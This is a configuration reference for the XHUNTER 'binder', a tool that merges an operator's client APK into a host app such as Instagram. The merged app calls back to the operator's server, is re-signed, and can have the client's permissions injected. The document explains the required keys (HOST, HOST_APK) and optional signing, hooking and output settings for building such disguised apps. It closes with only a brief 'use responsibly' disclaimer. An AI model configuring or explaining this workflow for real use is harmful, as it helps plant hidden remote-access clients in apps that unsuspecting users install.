# XHUNTER — binder `config.txt` reference

**Primary path in v2.0:** merge from the **operator Android app** (in-app binder — see [README](../README.md) screenshots). Use this **desktop** tree when you want scripted/CI merges on **Mac**, **Linux**, or **Windows** (**Git Bash** / **WSL**). End-to-end VPS + dual-workflow detail: **[USAGE.md](../USAGE.md)**.

This file documents only the **`config.txt`** keys. Optional keys match what `binder.sh` reads; leave them commented in the template to use built-in defaults.

## What is in the `binder` folder

| Item | What it is for |
|------|-----------------|
| `setup.sh` | Confirms **Java** and that bundled files under `vendor/` (tools, client package, signing) are present. |
| `binder.sh` | Runs the merge from **`config.txt`**. You get an **interactive list** to choose the hook activity (use a real terminal, not a pipe). |
| `config.txt` | You edit: at minimum **`HOST`** and **`HOST_APK`**. |
| `vendor/` | Apktool, client APK, and signing material used unless you override signing paths below. |
| `apps/` | Host APK for merge (e.g. `instagram.apk`) — download **[instagram.apk](https://github.com/anirudhmalik/xhunter/releases/download/v2.0/instagram.apk)** from **[v2.0](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0)** or use your own file; set **`HOST_APK`** to match. |

## `config.txt` parameters

One `KEY=value` per line. Lines starting with `#` are comments. **UTF-8**; on Windows use **LF** line endings. Paths are **absolute** or **relative to the `binder` directory** (where `config.txt` lives).

### Required

| Key | Meaning |
|-----|---------|
| **`HOST`** | Address the **merged** app uses to reach your server (same as **VPS / server IP** in the main README, after the tunnel is working). |
| **`HOST_APK`** | Path to the host APK to merge, e.g. `apps/instagram.apk` (use the [release `instagram.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0/instagram.apk) or your own APK). |

### Optional

| Key | Meaning |
|-----|---------|
| **`OUT_APK`** | Output signed APK. Default: `./out/xhunter-merged.apk` (relative to `binder/`). |
| **`WORK_DIR`** | Apktool workspace. Empty = temp dir; set a path to keep decode output. |
| **`SIGN_KEY`** | Private signing key (PKCS#8). If unset, default under `vendor/client/`. |
| **`SIGN_CERT`** | Signing cert (PEM). If unset, default under `vendor/client/`. |
| **`MIN_SDK`** | Minimum API level; leave commented for binder default. |
| **`INJECT_PERMISSIONS`** | `true` / `false` — merge client permissions into the host manifest. |
| **`HOOK_LIST_MAX`** | Max activities listed in the hook menu. |
| **`KEEP_WORK`** | `true` to keep apktool workspace on success. |
| **`AAPT2`** | Path to **aapt2** if auto-detection fails. |
| **`FRAMEWORK_DIR`** | Optional apktool framework path. |

## Use responsibly

Only merge and install software you are allowed to modify and use. You are responsible for laws and app-store rules.
